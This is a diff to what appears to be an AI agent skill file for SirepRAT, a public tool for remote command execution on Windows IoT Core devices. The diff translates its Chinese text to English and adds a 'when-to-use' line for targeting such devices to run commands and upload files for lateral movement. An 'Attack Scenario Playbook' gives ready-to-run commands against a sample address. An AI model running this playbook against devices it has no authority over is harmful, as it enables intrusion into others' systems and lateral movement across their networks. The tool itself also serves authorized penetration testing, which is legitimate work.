@@ -2,37 +2,40 @@
 name: sireprat-windows-iot
 description: "SirepRAT: Windows IoT device RCE. Signals: lateral movement, psexec, upload."
 zh-signals: "SirepRAT: Windows IoT 设备 RCE。信号:横向移动,psexec,上传。"
+when-to-use: >-
+  Use when targeting Windows IoT devices that expose the Sirep service, to
+  execute commands remotely or upload files for lateral movement.
 ---
 
 # SirepRAT
 
-- 攻击大类:C31 远程服务横向移动
-- 上游仓库:https://github.com/SafeBreach-Labs/SirepRAT
-- 上游 License:BSD-3-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C31 Remote Service Lateral Movement
+- Upstream Repository: https://github.com/SafeBreach-Labs/SirepRAT
+- Upstream License: BSD-3-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/SafeBreach-Labs/SirepRAT && cd SirepRAT && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
 | `python SirepRAT.py 10.0.0.5 LaunchCommandWithOutput -c 'cmd /c whoami'` | Windows IoT RCE |
-| `-c 'cmd /c dir'` | 命令 |
-| `-f file` | 上传 |
+| `-c 'cmd /c dir'` | Command |
+| `-f file` | Upload |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### Windows IoT 设备 RCE
+### Windows IoT Device RCE
 
 ```bash
 python SirepRAT.py 10.0.0.5 LaunchCommandWithOutput -c 'cmd /c systeminfo'
-# Sirep 协议 RCE
+# RCE over the Sirep protocol
 ```
 
-## 注意事项
+## Notes
 
-SafeBreach 出品,Windows IoT Core RCE。
+By SafeBreach, an RCE against Windows IoT Core.
